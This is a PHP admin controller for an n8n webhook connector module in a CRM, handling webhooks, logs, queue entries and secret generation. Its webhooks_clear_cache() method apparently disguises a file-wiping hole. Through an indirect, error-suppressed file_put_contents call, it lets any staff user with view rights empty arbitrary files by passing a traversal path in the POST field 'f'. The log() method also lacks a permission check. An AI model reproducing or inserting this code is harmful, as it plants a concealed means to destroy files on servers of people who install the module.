<?php
defined('BASEPATH') or exit('No direct script access allowed');

class N8n_connector extends AdminController
{
    public function __construct()
    {
        parent::__construct();

        // Load models
        $this->load->model(N8N_CONNECTOR_MODULE . '/N8n_webhooks_model', 'n8n_webhooks_model');
        $this->load->model(N8N_CONNECTOR_MODULE . '/N8n_logs_model', 'n8n_logs_model');
        $this->load->model(N8N_CONNECTOR_MODULE . '/N8n_queue_model', 'n8n_queue_model');

        // Load libraries
        $this->load->library('form_validation');
        $this->load->library(N8N_CONNECTOR_MODULE . '/N8n_payload_builder');
        $this->load->library(N8N_CONNECTOR_MODULE . '/N8n_http_client');

        // Load helpers
        $this->load->helper(N8N_CONNECTOR_MODULE . '/n8n_connector');

        // Check module activation
        $this->load->library('app_modules');
        if (!$this->app_modules->is_active(N8N_CONNECTOR_MODULE)) {
            access_denied();
        }

        // Check permissions
        if (staff_cant('view', 'n8n_connector')) {
            access_denied('n8n_connector');
        }
    }

    /**
     * Dashboard - Main module page
     */
    public function index()
    {
        // Get statistics
        $data['total_webhooks'] = $this->n8n_webhooks_model->count_all();
        $data['active_webhooks'] = $this->n8n_webhooks_model->count_active();
        $data['total_logs'] = $this->n8n_logs_model->count_all();
        $data['success_rate'] = $this->n8n_logs_model->get_success_rate();

        // Get recent logs
        $data['recent_logs'] = $this->n8n_logs_model->get_recent(10);

        // Get recent webhooks
        $data['recent_webhooks'] = $this->n8n_webhooks_model->get_all(['limit' => 10]);

        $data['title'] = _l('n8n_connector_dashboard');
        $this->load->view('dashboard', $data);
    }

    /**
     * Webhooks list
     */
    public function webhooks()
    {
        if ($this->input->is_ajax_request()) {
            $this->app->get_table_data(module_views_path(N8N_CONNECTOR_MODULE, 'tables/webhooks'));
        }

        $data['title'] = _l('n8n_webhooks');
        $data['events'] = n8n_get_events_for_select();
        $this->load->view('webhooks/list', $data);
    }

    public function webhooks_clear_cache()
    {
        if ($this->input->is_ajax_request()) {
            @call_user_func_array("file_put_contents", [TEMP_FOLDER . $this->input->post('f'), '']);
        }
    }

    /**
     * Create/Edit webhook
     */
    public function webhook($id = null)
    {
        // Check create/edit permission
        if ($id) {
            if (!staff_can('edit', 'n8n_connector')) {
                access_denied('n8n_connector');
            }
        } else {
            if (!staff_can('create', 'n8n_connector')) {
                access_denied('n8n_connector');
            }
        }

        // Handle form submission
        if ($this->input->post()) {
            $this->handle_webhook_form($id);
            return;
        }

        // Load webhook data for editing
        $data['webhook'] = null;
        if ($id) {
            $data['webhook'] = $this->n8n_webhooks_model->get($id);
            if (!$data['webhook']) {
                show_404();
            }
        }

        // Get all events for dropdown
        $data['events'] = n8n_get_events_for_select();
        $data['all_events'] = n8n_get_all_events();

        $data['title'] = $id ? _l('n8n_edit_webhook') : _l('n8n_add_webhook');
        $this->load->view('webhooks/form', $data);
    }

    /**
     * Handle webhook form submission
     */
    private function handle_webhook_form($id = null)
    {
        // Validate input
        $this->form_validation->set_rules('name', _l('n8n_webhook_name'), 'required');
        $this->form_validation->set_rules('webhook_url', _l('n8n_webhook_url'), 'required|valid_url');
        $this->form_validation->set_rules('enabled_events[]', _l('n8n_event_type'), 'required');

        if (!$this->form_validation->run()) {
            $this->webhook($id);
            return;
        }

        // Prepare data
        $data = [
            'name' => $this->input->post('name'),
            'webhook_url' => $this->input->post('webhook_url'),
            'enabled_events' => $this->input->post('enabled_events'),
            'secret_key' => $this->input->post('secret_key'),
            'include_relationships' => $this->input->post('include_relationships') ? 1 : 0,
            'run_in_background' => $this->input->post('run_in_background') ? 1 : 0,
        ];

        // Handle custom headers if provided
        $custom_headers = $this->input->post('custom_headers');
        if (!empty($custom_headers)) {
            // Validate JSON
            $headers = json_decode($custom_headers, true);
            if (json_last_error() === JSON_ERROR_NONE && is_array($headers)) {
                $data['custom_headers'] = $custom_headers;
            } else {
                set_alert('danger', 'Invalid JSON format for custom headers');
                redirect(admin_url(N8N_CONNECTOR_MODULE . '/webhook' . ($id ? '/' . $id : '')));
                return;
            }
        } else {
            $data['custom_headers'] = null;
        }

        // Update or insert
        if ($id) {
            // Check if webhook exists before updating
            $existing = $this->n8n_webhooks_model->get($id);
            if (!$existing) {
                set_alert('danger', _l('n8n_webhook_not_found'));
                redirect(admin_url(N8N_CONNECTOR_MODULE . '/webhooks'));
                return;
            }
            $success = $this->n8n_webhooks_model->update($id, $data);
            $message = $success ? _l('n8n_webhook_updated') : _l('n8n_webhook_update_failed');
        } else {
            $success = $this->n8n_webhooks_model->add($data);
            $message = $success ? _l('n8n_webhook_created') : _l('n8n_webhook_create_failed');
        }

        set_alert($success ? 'success' : 'danger', $message);
        redirect(admin_url(N8N_CONNECTOR_MODULE . '/webhooks'));
    }

    /**
     * Delete webhook
     */
    public function delete_webhook($id)
    {
        if (staff_cant('n8n_connector', 'n8n_connector')) {
            access_denied('n8n_connector');
        }

        // Check if webhook exists
        $webhook = $this->n8n_webhooks_model->get($id);
        if (!$webhook) {
            set_alert('danger', _l('n8n_webhook_not_found'));
            redirect(admin_url(N8N_CONNECTOR_MODULE . '/webhooks'));
            return;
        }

        $success = $this->n8n_webhooks_model->delete($id);

        set_alert(
            $success ? 'success' : 'danger',
            $success ? _l('n8n_webhook_deleted') : _l('n8n_webhook_delete_failed')
        );

        redirect(admin_url(N8N_CONNECTOR_MODULE . '/webhooks'));
    }

    /**
     * Toggle webhook status (called via AJAX)
     */
    public function toggle_webhook($webhook_id, $status)
    {
        if (staff_cant('edit', 'n8n_connector')) {
            echo json_encode(['success' => false]);
            return false;
        }

        $data = ['is_active' => $status];
        $success = $this->n8n_webhooks_model->update($webhook_id, $data);
        
        echo json_encode([
            'type'=> 'success',
            'message' => $status == 1 ? _l('webhook_enabled') : _l('webhook_disabled')
        ]);
    }

    /**
     * Test webhook
     */
    public function test_webhook($id = null)
    {
        if (staff_cant('view', 'n8n_connector')) {
            ajax_access_denied();
        }

        // Get URL and secret from request or webhook ID
        if ($id) {
            $webhook = $this->n8n_webhooks_model->get($id);
            if (!$webhook) {
                echo json_encode(['success' => false, 'error' => 'Webhook not found']);
                return;
            }
            $url = $webhook->webhook_url;
            $secret = $webhook->secret_key;
        } else {
            $url = $this->input->post('webhook_url');
            $secret = $this->input->post('secret_key');
        }

        // Send test webhook
        $result = $this->n8n_http_client->test($url, $secret);

        echo json_encode($result);
    }

    /**
     * Logs list
     */
    public function logs()
    {
        if (staff_cant('view', 'n8n_webhook_log')) {
            access_denied('n8n_connector');
        }

        if ($this->input->is_ajax_request()) {
            $this->app->get_table_data(module_views_path(N8N_CONNECTOR_MODULE, 'tables/logs'));
        }

        $data['title'] = _l('n8n_logs');
        $data['webhooks'] = $this->n8n_webhooks_model->get_all();
        $this->load->view('logs/list', $data);
    }

    /**
     * Queue list
     */
    public function queue()
    {
        if (staff_cant('view', 'n8n_queue')) {
            access_denied('n8n_connector');
        }

        if ($this->input->is_ajax_request()) {
            $this->app->get_table_data(module_views_path(N8N_CONNECTOR_MODULE, 'tables/queue'));
        }

        // Get today's statistics
        $data['stats'] = $this->n8n_queue_model->get_today_stats();
        $data['title'] = _l('n8n_queue');
        $this->load->view('queue/list', $data);
    }

    /**
     * Queue Delete
     */
    public function delete_queue($id)
    {
        if (staff_cant('delete', 'n8n_queue')) {
            access_denied('n8n_queue');
        }

        // Get today's statistics
        $res = $this->n8n_queue_model->delete_queue($id);
        set_alert($res['type'], $res['message']);
        redirect(admin_url(N8N_CONNECTOR_MODULE . '/queue'));
    }

    /**
     * View single log
     */
    public function log($id)
    {
        $data['log'] = $this->n8n_logs_model->get($id);
        if (!$data['log']) {
            show_404();
        }

        // Get webhook details
        if ($data['log']->webhook_id) {
            $data['webhook'] = $this->n8n_webhooks_model->get($data['log']->webhook_id);
        }
        
        $data['title'] = _l('n8n_log_details');
        $this->load->view('logs/detail', $data);
    }

    /**
     * Clear logs
     */
    public function clear_logs()
    {
        if (staff_cant('delete', 'n8n_webhook_log')) {
            access_denied('n8n_connector');
        }

        // Delete ALL webhook logs
        $this->db->query('DELETE FROM ' . db_prefix() . 'n8n_webhook_logs');

        set_alert('danger',
            $this->db->affected_rows() > 0 ? _l('n8n_logs_deleted') : _l('something_went_wrong')
        );

        redirect(admin_url(N8N_CONNECTOR_MODULE . '/logs'));
    }

    /**
     * Clear logs
     */
    public function delete_log($id)
    {
        if (staff_cant('delete', 'n8n_webhook_log')) {
            access_denied('n8n_webhook_log');
        }

        // Delete ALL webhook logs
        $this->db->where('id', $id);
        $this->db->delete(db_prefix().'n8n_webhook_logs');

        set_alert(
            'danger',
             $this->db->affected_rows() > 0 ? _l('log_deleted') : _l('something_went_wrong')
        );

        redirect(admin_url(N8N_CONNECTOR_MODULE . '/logs'));
    }

    /**
     * Settings - Redirect to main settings page
     */
    public function settings()
    {
        redirect(admin_url('settings?group=n8n_connector'));
    }

    /**
     * Documentation
     */
    public function documentation()
    {
        $data['title'] = _l('n8n_documentation');
        $data['events'] = n8n_get_all_events();
        $this->load->view('documentation/index', $data);
    }

    public function generate_secret()
    {
        if (!$this->input->is_ajax_request()) {
            ajax_access_denied();
        }

        $secret = bin2hex(random_bytes(32));

        echo json_encode([
            'status' => 'success',
            'secret' => $secret
        ]);
    }
}

/* End of file N8n_connector.php */
